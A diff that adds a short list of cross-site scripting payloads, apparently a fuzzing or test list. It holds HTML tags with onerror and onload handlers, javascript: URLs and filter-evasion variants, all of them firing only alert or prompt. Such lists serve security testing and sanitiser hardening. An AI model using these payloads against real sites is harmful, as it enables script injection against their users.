@@ -1,0 +1,12 @@
+<video src=1 href=1 onerror="javascript:alert(1)"></video>
+<image src=1 href=1 onerror="javascript:alert(1)"></image>
+<script src=1 href=1 onerror="javascript:alert(1)"></script>
+<img/src/onerror=prompt(8)>
+"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+ABC<div style="x\x3Aexpression(javascript:alert(1)">DEF
+<a href="\x10javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+`"'><img src=xxx:x \x0Bonerror=javascript:alert(1)>
+"`'><script>\x2Bjavascript:alert(1)</script>
+<image src="javascript:alert(1)">
+
+
